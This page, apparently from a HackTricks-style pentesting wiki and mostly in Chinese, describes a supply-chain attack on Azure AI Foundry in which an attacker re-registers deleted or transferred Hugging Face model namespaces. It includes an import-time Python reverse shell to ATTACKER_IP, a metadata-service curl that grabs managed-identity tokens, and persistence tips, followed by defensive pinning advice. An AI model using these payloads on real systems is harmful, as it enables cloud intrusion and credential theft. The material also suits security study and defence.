# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 场景

- Azure AI Foundry Model Catalog 包含许多可一键部署的 Hugging Face (HF) 模型。
- HF model identifiers are Author/ModelName。 如果某个 HF author/org 被删除，任何人都可以重新注册该 author 并在 legacy path 发布具有相同 ModelName 的模型。
- 那些仅按名称拉取（no commit pinning/integrity）的 pipelines 和 catalogs 会解析到被攻击者控制的 repos。当 Azure 部署模型时，loader code 可能在 endpoint 环境中执行，从而以该 endpoint 的权限获得 RCE。

常见的 HF takeover 情况：
- Ownership deletion：旧路径返回 404，直到被接管。
- Ownership transfer：当旧 author 仍存在时，旧路径会 307 重定向到新 author。如果旧 author 之后被删除并被重新注册，重定向会失效，攻击者的 repo 将在 legacy path 提供服务。

## 识别可重用的命名空间 (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## 针对 Azure AI Foundry 的端到端攻击流程

1) 在 Model Catalog 中，查找在 HF 上原始 author 已被删除或转移（旧 author 已被移除）的模型。
2) 在 HF 上重新注册被弃用的 author 并重建 ModelName。
3) 发布一个包含在 import 时执行或需要 trust_remote_code=True 的 loader code 的恶意 repo。
4) 从 Azure AI Foundry 部署遗留的 Author/ModelName。平台会拉取攻击者的 repo；loader 在 Azure endpoint 容器/VM 内执行，从而在具有 endpoint permissions 的情况下造成 RCE。

示例 payload 片段，在 import 时执行（仅用于演示）：
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
注意
- AI Foundry 部署在集成 HF 时，通常会克隆并导入模型配置所引用的仓库模块（例如 auto_map），这可能触发代码执行。某些路径需要 trust_remote_code=True。
- 访问通常与该端点的 managed identity/service principal 权限一致。应将其视为在 Azure 内进行数据访问和横向移动的初始访问据点。

## Post-Exploitation 提示 (Azure 端点)

- 枚举环境变量和 MSI 端点以获取令牌：
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- 使用获取的 token 检查已挂载的存储、模型工件以及可访问的 Azure 服务。
- 如果平台会从 HF 重新拉取，可考虑通过留下被投毒的模型工件实现持久性。

## Azure AI Foundry 用户的防御建议

- 从 HF 加载时按 commit 固定模型：
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 将已审核的 HF 模型镜像到受信任的内部注册表并从那里部署。
- 持续扫描代码库和 defaults/docstrings/notebooks 中的硬编码 Author/ModelName（已被删除/转移）；进行更新或固定版本。
- 在部署前验证 author 是否存在以及 model provenance。

## 识别启发式 (HTTP)

- Deleted author: author 页面 404；legacy model path 404，直到被接管。
- Transferred model: legacy path 307 指向新 author，而旧 author 仍存在；如果旧 author 之后被删除并重新注册，legacy path 会提供攻击者内容。
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 交叉引用

- 有关更广泛的方法论和供应链说明，请参见：

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考资料

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
